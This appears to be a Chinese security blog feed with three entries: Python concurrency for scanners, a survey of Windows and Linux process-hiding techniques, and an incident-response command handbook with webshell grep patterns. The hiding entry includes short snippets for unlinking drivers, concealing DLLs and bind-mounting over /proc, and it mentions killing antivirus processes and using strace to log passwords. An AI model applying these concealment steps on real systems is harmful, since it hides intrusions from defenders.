<div class="highlighter-rouge"><pre class="highlight"><code># -*- coding: utf-8 -*-
# from multiprocessing import Pool 多进程
from multiprocessing.dummy import Pool as ThreadPool #多线程
import time
import urllib2
 
urls = [
    'http://www.python.org', 
    'http://www.python.org/about/',
    'http://www.onlamp.com/pub/a/python/2003/04/17/metaclasses.html',
    ]
 
# 单线程
start = time.time()
results = map(urllib2.urlopen, urls)
print 'Normal:', time.time() - start
 
# 多线程
start2 = time.time()
# 开4个 worker，没有参数时默认是 cpu 的核心数
pool = ThreadPool(4)
# 在线程中执行 urllib2.urlopen(url) 并返回执行结果
results2 = pool.map(urllib2.urlopen, urls)
pool.close()
pool.join()
print 'Thread Pool:', time.time() - start2

</code></pre>
</div>

<p>另一个是pool.ThreadPool：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>from multiprocessing.pool import ThreadPool
 
def foo(bar, baz):
  print 'hello {0}'.format(bar)
  return 'foo' + baz
 
pool = ThreadPool(processes=1)
 
async_result = pool.apply_async(foo, ('xiaorui.cc', 'foo',))

return_val = async_result.get()
</code></pre>
</div>

<h4 id="进程池">进程池</h4>

<ul>
  <li>multiprocessing进程池</li>
</ul>

<p>注意下面代码的注释，apply_async和apply函数，前者是非阻塞的，后者是阻塞。可以看出运行时间相差的倍数正是进程池数量。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>import multiprocessing
import time

def func(msg):
    print "msg:", msg
    time.sleep(3)
    print "end"
    return "done" + msg

if __name__ == "__main__":
    pool = multiprocessing.Pool(processes=4)
    result = []
    for i in xrange(3):
        msg = "hello %d" %(i)
        #result.append(pool.apply(func, (msg, )))
		result.append(pool.apply_async(func, (msg, )))
    pool.close()
    pool.join()
    for res in result:
        print ":::", res.get()
    print "Sub-process(es) done."
</code></pre>
</div>

<h3 id="封装库">封装库</h3>

<p>网上还有一些通过封装多进程、多线程、队列组合成的第三方库，也能达到比较好的效果，这种库对于细节的优化较好。</p>

<p>下面是某个第三方库的代码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#coding=utf-8

import threading
import Queue

from billiard.dummy import DummyProcess

class work(DummyProcess):
    def __init__(self, workQueue, result_queue, timeout=5, **kwargs):
        self.timeout = timeout
        self.result_queue = result_queue
        self.isRunning = False
        self.workQueue = workQueue
        DummyProcess.__init__(self, kwargs=kwargs)


    def stop(self):
        self.isRunning = False

    def run(self):
        self.isRunning = True
        while self.isRunning:
            try:
                func, args, kwargs = self.workQueue.get(timeout=self.timeout)
                result = apply(func, *args, **kwargs)
                self.workQueue.task_done()
                self.result_queue.put(result, False)
            except Queue.Empty:
                self.isRunning = False
            except:
                pass

class ThreadPool:
    def __init__(self, num_of_threads=10):
        self.workQueue = Queue.Queue()
        self.result_queue = Queue.Queue()
        self.threads = []

        for i in range(num_of_threads):
            thread = work(self.workQueue, self.result_queue)
            self.threads.append(thread)

    def add_job(self, fun, *args, **kwargs):
        self.workQueue.put((fun, args, kwargs))
    
    def get_result(self):
        results = []
        try:
            while True:
                result = self.result_queue.get(block=False)
                results.append(result)
        except Exception,e:
            print str(e)
        finally:
            return results

    def start(self):
        try:
            for t in self.threads:
                t.start()
        except:
            self.stop()

    def stop(self):
        for t in self.threads:
            t.stop()

    def wait_for_complete(self):
        try:
            for t in self.threads:
                while t.isAlive():
                    t.join(10)

        except KeyboardInterrupt:
            self.stop()
            print


if __name__ == "__main__":
    tp = ThreadPool(20)
    for line in open('target.txt').readlines():
        evil = Evil_Class(line)
        tp.add_job(evil.run)
    tp.start()
    try:
        tp.wait_for_complete()
        resp = tp.get_result()
    except KeyboardInterrupt:
        tp.stop()


</code></pre>
</div>

<h3 id="分布式任务">分布式任务</h3>

<p>对于分布式任务的话，配置起来会比较麻烦。比如你就一台PC或者破VPS，还想搞多节点分布式任务，显然吃饱了撑着没事干。</p>

<p>分布式的优点的话，主要在于其可扩展性，理论上只要消息中间件和容错机制足够稳健，带宽足够高，就能最大化提升扫描器的性能。</p>

<ul>
  <li>celery</li>
</ul>

<p>celery是一个国外的分布式调度框架，在扫描器方面，我们可以采用几种方案：</p>

<blockquote>
  <ol>
    <li>单机器 + 多节点 + 线/进程池</li>
    <li>多机器 + 多节点 + 线/进程池</li>
    <li>多机器 + 多节点</li>
  </ol>
</blockquote>

<p>前两条对扫描器性能提升确实是有的，但如果个别网络任务如果耗时较长的话，会持续占用进而耗尽节点的资源。
即使每条任务里，我们都会尽可能提升进程/线程数，但如果其中仍然包含有多级网络任务调用，那么扫描的速率也不会有太大的提升。因为除了机器资源以外，扫描器还会受带宽、网卡出口等其他因素的影响。</p>

<p>如果我们遵循第三条，最大化利用celery节点运行任务，将所有线/进程池尽可能替换，则会是另一个场景。
当每一个插件或者fuzz脚本，都作为单条任务去运行时，容错机制会及时结束掉每一个失败/超时的任务。在我们做好中间件和存储的灾备机制的前提下，扫描器将会变得更加稳健。</p>

<ul>
  <li>bugscan</li>
</ul>

<p>当然，业内也有小伙伴做出了基于rpc通信的异步任务管理框架，如bugscan。</p>

<p>其节点有三个核心：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Service: rpc client, 负责与server通信, 获取任务插件，发送报告等操作。
Task_Manager: 任务管理器, 执行添加，删除任务的操作。
Task: 获取插件，执行任务，输出报告。
</code></pre>
</div>

<p>其运作的大概流程，这里就直接复制别人的分析报告了：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>无限循环 -&gt; service 获取任务列表 -&gt; 是否有待执行的任务 -&gt; 发送至 task_manager -&gt; 添加任务 -&gt; 调用 task -&gt; task 执行任务 -&gt; service 设置任务状态 -&gt; 是否返回报告 -&gt; service 发送报告 -&gt; 是否有待停止的任务 -&gt; 发送至 task_manager -&gt; 删除任务 -&gt; 调用 task -&gt; task 停止任务 -&gt; service 设置任务状态 -&gt; 无限循环
</code></pre>
</div>

<p>有兴趣的朋友可以看看原文，这是关于bugscan的一篇详细分析：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>https://www.chabug.org/tools/553.html
</code></pre>
</div>

<ul>
  <li>多种其他异步任务框架</li>
</ul>

<p>相似的框架还是蛮多的，就不一一列举了。</p>

<ol>
  <li>dramatiq</li>
  <li>sidekiq</li>
  <li>huey</li>
  <li>thriftpy</li>
</ol>

<h3 id="结语">结语</h3>

<p>总而言之，只要我们合理利用可以加速的库，可以更好地打造我们的扫描器。本文聊的内容比较基础，接下来的文章里，笔者打算通过细分领域，重点拿经典项目的案例进行剖析。</p>

<h3 id="参考文章">参考文章</h3>

<p><a href="https://www.cnblogs.com/xiaozi/p/6182990.html">python线程池（threadpool）模块使用笔记</a></p>

<p><a href="https://www.cnblogs.com/zhang293/p/7954353.html">多种方法实现 python 线程池</a></p>

<p><a href="http://xiaorui.cc/2015/11/03/%E7%90%86%E8%A7%A3python%E7%9A%84multiprocessing-pool-threadpool%E5%A4%9A%E7%BA%BF%E7%A8%8B/">理解python的multiprocessing.pool threadpool多线程</a></p>

<p><a href="https://blog.csdn.net/ns2250225/article/details/48755741">使用 multiprocessing.dummy 执行多线程任务</a></p>

<p><a href="https://www.cnblogs.com/lxmhhy/p/6052167.html">python 多进程使用总结</a></p>

<p><a href="https://www.cnblogs.com/PrettyTom/p/6582357.html">Python的多进程</a></p>

<p><a href="https://www.chabug.org/tools/553.html">[X1r0z]模拟bugscan node的通信机制及在线体验
</a></p>

]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[浅谈进程隐藏之术]]></title>
      <url>/cert/2018/07/04/hide-process/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>前段时间遇到了一些【进程隐藏】相关的应急事件，故此心生一念，对网上一些资料和部分个人经验做了总结，以飨众人。</strong></span>
</p>

<h3 id="windows进程隐藏">windows进程隐藏</h3>

<h4 id="基于系统服务的进程隐藏技术">基于系统服务的进程隐藏技术</h4>

<p>在WIN 9X系列操作系统中, 系统进程列表中不能看到任何系统服务进程, 因此只需要将指定进程注册为系统服务就能够使该进程从系统进程列表中隐形。</p>

<p>在WIN 9X下用RegisterServiceProcess函数隐藏进程，NT架构下用不了 即win2000和xp等什么的用不了此方法。</p>

<p>替换tasklist、ps、top
https://blog.csdn.net/qq_27446553/article/details/54591099
windows高版本内核难以进行真正的进程隐藏，除非编写底层驱动。
在进程LoadLibrary某个DLL文件后，这个DLL是不可以被删除的，但是可以改名和移动位置（当然，就算移动了位置也不可以删除它），所以代码中可以用MoveFile移动到某个角落去。
这样，DLL就从原来的位置消失了，而新位置在资源管理器中又无法访问到，达到了简单隐藏DLL的目的。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>CreateDirectory('d:\test\....\', nil);
MoveFile('D:\test\Hack.dll', 'd:\test\....\Hack.dll');
</code></pre>
</div>

<h4 id="基于api-hook的进程隐藏技术">基于API HOOK的进程隐藏技术</h4>

<p>API HOOK指的是通过特殊的编程手段截获WINDOWS系统调用的API函数,并将其丢弃或者进行替换。 通过API
HOOK编程方法,截获系统遍历进程函数并对其进行替换,可以实现对任意进程的隐藏。</p>

<h4 id="基于-dll-的进程隐藏技术远程注入dll技术">基于 DLL 的进程隐藏技术:远程注入Dll技术</h4>

<p>先编写一个API的DLL，将它远程注入进程，写入远程进程的内存地址空间，并建立远程线程执行。</p>

<p>不触发PG（patchguard），又能隐藏驱动：
当驱动加载时 会将驱动信息加入那个链表，可以直接阻止这个加入的过程。
“MiProcessLoaderEntry”，这个函数将驱动信息加入链表和移除链表：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>调用MiProcessLoaderEntry(pDriverObject-&gt;DriverSection, 0);
PCHunter显示为红色~

能不能完全隐藏?
pTargetDriverObject-&gt;DriverSection = NULL;

// 破坏驱动对象特征
pTargetDriverObject-&gt;DriverStart = NULL;
pTargetDriverObject-&gt;DriverSize = NULL;
pTargetDriverObject-&gt;DriverUnload = NULL;
pTargetDriverObject-&gt;DriverInit = NULL;
pTargetDriverObject-&gt;DeviceObject = NULL;
</code></pre>
</div>

<h4 id="基于远程线程注入代码的进程隐藏技术">基于远程线程注入代码的进程隐藏技术</h4>

<p>这种方法与远程线程注入DLL的原理一样,都是通过在某进程中创建远程线程来共享该进程的内存空间。</p>

<p>所不同的是,远程线程注入代码通过直接拷贝程序代码到某进程的内存空间来达到注入的目的。</p>

<p>因为程序代码存在于内存中,不仅进程列表中无法检测,即使遍历进程加载的内存模块也无法找到被隐藏程序的踪迹。</p>

<h4 id="rootkit方式">Rootkit方式</h4>

<p>Intel CPU 有4 个特权级别： Ring 0， Ring 1， Ring 2， Ring 3。Windows 只使用了其中的 Ring  0 和  Ring  3 两个级别。</p>

<p>操作系统分为内核和外壳两部分：内核运行在Ring0级，通常称为核心态（或内核态），用于实现最底层的管理功能，在内核态可以访问系统数据和硬件，包括处理机调度、内存管理、设备管理、文件管理等；外壳运行在 Ring 3级，通常称为用户态，是基于内核提供的交互功能而存在的界面，它负责指令传递和解释。通常情况下，用户态的应用程序没有权限访问核心态的地址空间。</p>

<p>Rootkit 是攻击者用来隐藏自己的踪迹和保留 root 访问权限的工具，它能使攻击者一直保持对目标机器的访问，以实施对目标计算机的控制[1]。从 Rootkit 运行的环境来看，可将
其分为用户级 Rootkit 和内核级 Rootkit。
用户态下，应用程序会调用 Win32 子系统动态库（包括Kernel32.dll， User32.dll， Gdi32.dll等）提供的Win32 API函数，它们是Windows提供给应用程序与操作系统的接口，运行在Ring3级。用户级 Rootkit 通常就是通过拦截 Win32 API，建立系统钩子，插入自己的代码，从而控制检测工具对进程或服务的遍历调用，实现隐藏功能。</p>

<p>内核级Rootkit 是指利用驱动程序技术或其它相关技术进入Windows 操作系统内核，通过对 Windows 操作系统内核相关的数据结构或对象进行篡改，以实现隐藏功能。</p>

<p>由于Rootkit运行在Ring0级别，甚至进入内核空间，因而可以对内核指令进行修改，而用户级检测却无法发现内核操作被拦
截。
下面介绍两种使用Rootkit技术来实现进程隐藏的方法。注册表来实现启动,因而易于被检测出来。显然,要增强进程的隐蔽性,关键在于增强加载程序文件的隐藏性。</p>

<ul>
  <li>SSDT Hook</li>
</ul>

<p>参考资料：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>进程隐藏与进程保护（SSDT Hook 实现）（一）
http://www.cnblogs.com/zmlctt/p/3979105.html

进程隐藏与进程保护（SSDT Hook 实现）（二）
https://www.cnblogs.com/zmlctt/p/3979108.html

进程隐藏与进程保护（SSDT Hook 实现）（三）
http://www.cnblogs.com/BoyXiao/archive/2011/09/05/2168115.html
</code></pre>
</div>

<ul>
  <li>DKOM（Direct Kernel Object Manipulation，直接内核对象操作）</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>使用DKOM方法进行进程隐藏。在Windows操作系统中，系统会为每一个活动进程创建一个进程对象EPROCESS，为进程中的每一个线程创建一个线程对象 ETHREAD。

在 EPROCESS 进程结构中有个双向链表 LIST_ENTRY，LIST_ENTRY结构中有FLINK 和BLINK 两个成员指针，分别指向当前进程的前驱进程和后继进程。

如果要隐藏当前进程，只需把当前进程的前驱进程的BLINK 修改为当前进程的BLINK，再把当前进程的后继进程的FLINK修改为当前进程的FLINK。
</code></pre>
</div>

<ul>
  <li>关于断链隐藏进程</li>
</ul>

<p>Windows系统中的所有进程通过其ActiveProcessLinks结构中的指针来引用。它们构成了诸如taskmgr.exe（任务管理器）或某些SysInternals（例如procexp.exe）等工具使用的双链表。</p>

<p>DKOM技术【直接内核对象操纵（Direct Kernel Object Manipulation）】隐藏了一个取消链接它自己的ActiveProcessLinks的进程，并将“前一个”和“下一个”进程直接相互链接。
事实上，许多监控/系统工具（例如SysInternals Microsoft套件）都是基于双链表的进程枚举。</p>

<p>不过断链隐藏进程，容易蓝屏，貌似也过不了pg。</p>

<h3 id="linux进程隐藏">Linux进程隐藏</h3>

<ul>
  <li>
    <p>一种简单的方法：系统启动时会依据 /etc/fstab 文件内容来挂载分区，在 proc 分区挂载参数中加入 hidepid=2 参数后，登陆系统的用户只能查看到当前用户启动的进程的信息。也就是说， tomcat 用户只能看到属于 tomcat 用户进程的信息。</p>
  </li>
  <li>
    <p>在内核中新增两个信号，当进程向内核发出 hide 信号时，内核将不会为该进程在 /proc 目录下生成对应的目录，从而也就从底层铲除了进程的信息，即使黑客获得了 root 权限也无法通过常规手段察觉到蛛丝马迹。除此之外，新增的unhide信号作用恰好与 hide 信号相反。</p>
  </li>
  <li>
    <p>对其他用户隐藏</p>
  </li>
</ul>

<p>如果你使用的linux kernel(内核)是3.2以上的版本(或者使用的RHEL/CentOS是6.5以上的版本)，你就可以对其他用户隐藏进程。
只有root用户可以看到所有的进程，而非root用户，只能看到属于自己的进程信息。你所需要做的仅仅是开启linux kernel加固选项 “hidepid “来重新挂载 /proc文件系统。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>https://www.jb51.net/LINUXjishu/347787.html
</code></pre>
</div>

<ul>
  <li>linux下根据进程名称隐藏进程的PID</li>
</ul>

<ol>
  <li>
    <p>把要隐藏的进程PID设置为0，因为系统默认是不显示PID为0的进程，不过缺陷比较大。
其核心思想就是把task-&gt;pid变成0，就成了0号进程。而在ps，top命令中，是不显示0号进程的相关信息。这么一来，在/proc/文件夹下就不会有该进程的相关信息了。</p>
  </li>
  <li>
    <p>修改系统调用sys_getdents（）。</p>
  </li>
</ol>

<div class="highlighter-rouge"><pre class="highlight"><code>http://blog.chinaunix.net/uid-26585427-id-5077452.html
</code></pre>
</div>

<ol>
  <li>另外，还有一种比较简便的方法，就是把int main(int argc, char*argv[])中的参数变成0，那么就在单纯的ps命令中就不会显示进程相关信息，但是/proc/文件夹下，还会存在该进程的相关信息。</li>
</ol>

<div class="highlighter-rouge"><pre class="highlight"><code>https://blog.csdn.net/xqhrs232/article/details/51906206
</code></pre>
</div>

<ul>
  <li>遍历PspCidTable表检测隐藏进程</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>https://www.cnblogs.com/kuangke/p/5761615.html
</code></pre>
</div>

<ul>
  <li>部分补充说明</li>
</ul>

<p>在变更文件里可以看到一些挖矿程序，同时 /etc/ld.so.preload 文件的变更需要引起注意，这里涉及到 Linux 动态链接库预加载机制，是一种常用的进程隐藏方法，而 top 等命令都是受这个机制影响的。</p>

<p>可以看看其中有没有包含可疑的so文件，然后记录后去掉。</p>
<div class="highlighter-rouge"><pre class="highlight"><code>注意
/etc/rc.d/init.d/network
/etc/resolv.conf

cat /etc/ld.so.preload
top 查看pid
ls  -lh /proc/pid号
得到相关文件位置后进行清理
</code></pre>
</div>

<p>隐藏进程，会出现proc下面大小异常：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>cat /pro/$$/mountinfo 
cat /proc/mounts 
mount
以上三个等价，可靠性不同。

$$ 表示当前shell进程的进程ID

#处理后可以瞒过直接mount
cp /etc/mtab .
mount –bind /bin /proc/[pid]
mv . /etc/mtab

#这样可以进行隐藏
mount –bind /tmp/empty /proc/2694
</code></pre>
</div>

<h3 id="windows工具检查">Windows工具检查</h3>

<ul>
  <li>Winpmem内存转储【配合Volatility进行内存取证】</li>
  <li>冰刃</li>
  <li>process explorer</li>
  <li>Filemon：查看进程和文件对应</li>
  <li>Regmon：查看进程和注册表对应</li>
  <li>PC Hunter(xuetr) 可查看硬盘上隐藏的文件</li>
</ul>

<h4 id="手动杀进程">手动杀进程</h4>

<p>非常古老的pskill</p>
<div class="highlighter-rouge"><pre class="highlight"><code>pskill $PID
</code></pre>
</div>

<p>可以用它结束一些常见的杀毒软件进程，使用方法如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>c:\&gt; ProcessHacker.exe -c -ctype process -cobject $PID-Number -caction terminate
</code></pre>
</div>

<p>也是暂停进程的运行，如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>c:\&gt; ProcessHacker.exe -c -ctype process -cobject $PID-Number –caction suspend
</code></pre>
</div>

<p>wmic：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>wmic process where caption="qq.exe" delete
wmic process where handle=10000 delete
</code></pre>
</div>

<p>TASKKILL：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>TASKKILL /S system /F /IM notepad.exe /T
TASKKILL /PID 1230 /PID 1241 /PID 1253 /T
TASKKILL /F /IM QQ.exe
</code></pre>
</div>

<p>ntsd：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>ntsd -c q -p pid
</code></pre>
</div>

<h3 id="linux下工具检查">Linux下工具检查：</h3>

<ul>
  <li>暴力枚举进程
    <div class="highlighter-rouge"><pre class="highlight"><code>通过PsLookupProcessByProcessId获得EPROCESS
通过ZwQuerySystemInformation
通过进程活动连来枚举
</code></pre>
    </div>
  </li>
  <li>
    <p>hkrookit</p>
  </li>
  <li>
    <p>rkhunter</p>

    <p>具体用法，请查看：<a href="/pentest/2018/06/25/security-emergency/">《信安应急响应手册
》</a>。</p>
  </li>
  <li>偶然发现的小工具</li>
</ul>

<p>可检测通过Hook vfs 函数来隐藏的进程。</p>
<div class="highlighter-rouge"><pre class="highlight"><code>https://security.tencent.com/index.php/opensource/detail/16
</code></pre>
</div>

<ul>
  <li>Volatility：
    <div class="highlighter-rouge"><pre class="highlight"><code>pslist – 通过检查双链表来检测进程
pstree – 使用了相同技术，只是显示有小小的差别
psscan – 在内存中扫描_POOL_HEADER结构（内存页池）以识别相关进程
psxview – 几种技术的组合：
pslist：如上所述
psscan：如上所述
thrdproc：线程扫描，检索调度程序使用的_KTHREAD列表（不能在不中断进程执行的情况下修改它），然后搜索相关的_EPROCESS对象。
pspcid
csrss：csrss.exe进程保留着可以在其内存中检索到的进程的独立列表。
session
deskthrd
</code></pre>
    </div>
  </li>
</ul>

<h3 id="尾声">尾声</h3>

<p>需要强调的是，攻防都是相对的，技术是在进步的，工具需要配合手工才能变成神器。</p>

<p>以后在实践中遇到新东西，或者在其他资料站看到实用的内容，后面会继续给大家更新。</p>
]]></content>
      <categories>
        
          <category> cert </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[信安应急响应手册]]></title>
      <url>/pentest/2018/06/25/security-emergency/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>在我们工作过程中，难免会遇到一些需要应急响应的事件。在紧急情况下，某些平时的苦工可能会帮助我们简化流程。这里做下应急方面的笔记，列出一些实用的小技巧。</strong></span>
</p>

<h3 id="应急工具包">应急工具包</h3>

<h4 id="tools-for-windows">Tools for windows</h4>

<ul>
  <li>Logparser</li>
  <li>wireshark</li>
  <li>WSExplorer</li>
  <li>冰刃</li>
  <li>process explorer</li>
  <li>winsyscheck</li>
  <li>PC Hunter(xuetr) 可查看硬盘上隐藏的文件</li>
  <li>D盾/360网站卫士/安全狗</li>
  <li>Filemon：查看进程和文件对应</li>
  <li>Regmon：查看进程和注册表对应</li>
  <li>Rootkit Unhooker：Hook检测</li>
  <li>Rootkit Revelaer：rootkit检测</li>
  <li>LP_Check工具检查: 找出影子管理员和克隆账号</li>
  <li>Autoruns工具： 查看启动项</li>
  <li>bitsadmin /list/allusers/verbose【好像不大好使】</li>
</ul>

<h4 id="tools-for-linux">Tools for linux</h4>

<ul>
  <li>chkrookit</li>
  <li>rkhunter</li>
  <li>tshark</li>
  <li>shellpub(河马)</li>
  <li>Auditd【linux自带审计】</li>
</ul>

<p>简单用法：</p>

<p>1、chkrootkit</p>

<div class="highlighter-rouge"><pre class="highlight"><code>下载：wget –c ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
编译：tar xvzf chkrootkit.tar.gz
make sense
开始检测：./chkrootkit -q
如果出现INFECTED，说明检测出系统后门
可以直接使用./chkrootkit -q | grep INFECTED命令检测并筛选出存在INFECTED的内容
</code></pre>
</div>

<p>2、Rootkit Hunter</p>

<div class="highlighter-rouge"><pre class="highlight"><code>安装Rootkit Hunter：
tar xvzf rkhunter-xx.tar.gz
cd rkhunter-xx
./install.sh --layout default --install
开始检测：
rkhunter -check
</code></pre>
</div>

<p>3、强大的日志分析工具Log Parser
#分析IIS日志</p>

<div class="highlighter-rouge"><pre class="highlight"><code>LogParser.exe "select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log" -o:datagrid
</code></pre>
</div>

<p>有了这些我们就可以对windows日志进行分析了。</p>

<p>比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>LogParser.exe -i:EVT "SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,'|') AS USERNAME,EXTRACT\_TOKEN(Strings,2,'|') AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,'|') AS Client_IP FROM 'e:\logparser\xx.evtx' WHERE EventID=675"
</code></pre>
</div>

<h4 id="样本分析平台">样本分析平台</h4>

<ul>
  <li>VirusTotal（简称VT，https://www.virustotal.com/）</li>
  <li>国内的微步在线（https://x.threatbook.cn/）</li>
  <li>腾讯的哈勃系统（https://habo.qq.com/）</li>
  <li>金山的火眼（https://fireeye.ijinshan.com/）</li>
  <li>安全易【日志分析】（https://www.anquanyi.com/）</li>
  <li>http://www.virscan.org 多引擎可疑文件扫描</li>
  <li>https://ti.360.net/ 360威胁情报中心</li>
</ul>

<h4 id="日志相关">日志相关</h4>

<p>日志文件位置：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Apache日志位置配置在httpd.conf中。
IIS日志默认存放在%systemroot%\system32\LogFiles\W3SVC目录，如果没有，可以通过配置文件查找，WEB站点—属性—网站—W3C扩展日志文件格式—属性—日志文件目录
apache日志 /usr/local/apache/logs/access_log
weblogic日志 \your_domain\servers\AdminServer\logs\asscee_log
root命令记录 /root/.bash_history
普通用户命令记录：/home/普通用户/.bash_history
/var/log/messages 包括整体系统信息 系统启动期间的日志
/var/log/boot.log 包含系统启动的日志
/var/log/secure SSHD会将所有信息记录（包括失败记录）
/var/log/btmp 记录所有用户的最近信息
/var/log/*
</code></pre>
</div>

<h3 id="应急命令集">应急命令集</h3>

<h4 id="cmd-for-windows">cmd for windows</h4>

<div class="highlighter-rouge"><pre class="highlight"><code>netstat -b -n【查看目前的网络连接情况】
netstat -ano
tasklist | findstr xxx
taskkill /T /F /PID PID号

知道是上传目录，在web log中查看指定时间范围包括上传文件夹的访问请求
findstr /s /m /I "UploadFiles" *.log
某次博彩事件中的六合彩信息是six.js
findstr /s /m /I "six.js" *.aspx
根据shell名关键字去搜索D盘spy相关的文件有哪些
for /r d:\ %i in (*spy*.aspx) do @echo %i

来查看创建时间：
dir /tc 1.aspx

查看用户recent相关文件，通过分析最近打开分析可疑文件

a) C:\Documents and Settings\Administrator\Recent
b) C:\Documents and Settings\Default User\Recent
c) 开始,运行 %UserProfile%\Recent
</code></pre>
</div>

<h4 id="cmd-for-linux">cmd for linux</h4>

<div class="highlighter-rouge"><pre class="highlight"><code>netstat  -antpl
lsof -p PID号
cd /proc/pidnumber
ls -ail
rm –rf /proc/pidnumber/恶意程序

curl ip.cn -H "X-Forwarded-For: x.x.x.x"
ps -ef、lsof -i:8080、netstat -lanp

stat -- 获取比 ls 更多的信息

部分敏感命令：
users:显示当前登陆用户信息。
Who:显示谁正在使用系统本地节点的信息。
Last:显示系统曾经被登陆的用户和TTYS。
w:查看谁登陆到系统中，且在做什么操作。 
netstat -anp:查看端口对应的进程关系。
lsof -p PID:查看进程对应的文件，配合netstat -anp查看端口进程文件之间的关系，可以找到可以端口进程对应的文件。
lsof -i:查看实时的进程、服务与端口信息。
ps -aux:查看进程。
chkconfig -list:查看服务启动信息。
find / -perm -004000 -type f:输出所有设置了SUID的文件。
rpm -Va:列举全部软件包的变化情况。


lsof命令用于查看你进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)。找回/恢复删除的文件。是十分方便的系统监视工具，因为lsof命令需要访问核心内存和各种文件，所以需要root用户执行。
lsof -i:8080【进程号】

【ls实现列文件按时间排序】
1) ls -lt  时间最近的在前面
2) ls -ltr 时间从前到后
3) 利用sort
ls -l | sort +7 (日期为第8列)  时间从前到后
ls -l | sort -r +7 时间最近的在前面

【Strace动态调试】
strace -p PID

strace -o aa -ff -p ssh进程
grep open aa* | grep -v -e No -e null -e denied| grep WR
grep一下open系统调用，然后过滤掉错误信息和/dev/null信息，以及denied信息，并且找WR的
另外，这玩意儿可以当后门记录密码
---------------

查找shell：
find /var/www/html/ -type f -name "*.jsp" | xargs grep "exec("
find /site/* -type f -name "*.php" |xargs grep "eval(" 　
find /site/* -type f -name "*.asp" |xargs grep "execute("
find /site/* -type f -name "*.aspx" |xargs grep "eval("
如果木马做了免杀处理，可以查看是否使用加密函数
find /site/* -type f -name "*.php" |xargs grep "base64_decode"
find /site/* -type f -name "*.php" |xargs grep "@$"

新增文件分析
例如要查找24小时内被修改的JSP文件： 
find ./ -mtime 0 -name "*.jsp"
（最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）

查找72小时内新增的文件find / -ctime -2
PS：-ctime 内容未改变权限改变时候也可以查出
根据确定时间去反推变更的文件
ls -al /tmp | grep "Feb 27"

特殊权限的文件
查找777的权限的文件 find / *.jsp -perm 4777
---------------

查看可疑账号：

查看UID为0的帐号：awk -F: '{if($3==0)print $1}' /etc/passwd
查看能够登录的帐号：cat /etc/passwd | grep -E "/bin/bash$"
PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）

-----------------

查找日志：
1、注入漏洞记录
grep -i select%20 *.log  | grep 500 | grep -i \.php 
查找后缀为".log"文件，搜索关键字为"select%20",筛选存在"500"的行
grep -i sqlmap *.log
sqlmap默认User-Agent是sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)，查看存在sqlmap的行，可以发现sqlmap拖库的痕迹。

2、跨站漏洞记录
grep -i "script" *.log 查找存在script的行。

3、扫描器扫描
grep -i acunetix *.log AWVS扫描时，会发送大量含有"acunetix"的数据包

4、搜索特定时间的日志
grep \[07/Jul/2016:24:00:* *.log 可以结合入侵时间搜索，文件修改时间不可作为依据，菜刀上就可以修改文件时间属性。

5、搜索特定IP地址的日志
grep ^192.168.1.* *.log 搜索包含"192.168.1."字符串开头的行 
grep -v ^192.168.10.* *.log 不搜索包含"192.168.10."字符串开头的行 
可以结合网站、网络安全策略搜索能访问网站后台、FTP服务等的IP地址。
查看ip访问次数：
cat access.log | awk '{print $1}' | sort | uniq -c
cat /var/log/secure |grep ACCEPTED 查看ssh进入的ip

页面访问排名前十的IP
cat access.log | cut -f1 -d " " | sort | uniq -c | sort -k 1 -r | head -10
页面访问排名前十的URL
cat access.log | cut -f4 -d " " | sort | uniq -c | sort -k 1 -r | head -10
查看最耗时的页面
cat access.log | sort -k 2 -n -r | head 10
---------------

查看所有用户的定时任务：
for u in `cat /etc/passwd | cut -d":" -f1`;do crontab -l -u $u;done

netstat –tlp –ano | grep 'ip'



敏感文件：
/var/log/messages:记录整体系统信息，其中也记录某个用户切换到root权限的日志。 
/var/log/secure:记录验证和授权方面信息。例如sshd会将所有信息记录（其中包括失败登录）在这里。
/var/log/lastlog:记录所有用户的最近信息。二进制文件，因此需要用lastlog命令查看内容。
/var/log/btmp:记录所有失败登录信息。使用last命令可查看btmp文件。例如"last -f /var/log/btmp | more"。
/var/log/maillog:记录来着系统运行电子邮件服务器的日志信息。例如sendmail日志信息就送到这个文件中。
/var/log/mail/:记录包含邮件服务器的额外日志。
/var/log/wtmp或/var/log/utmp:记录登录信息。二进制文件，须用last来读取内容;
/etc/passwd:记录用户信息，查看是否存在可疑账号。
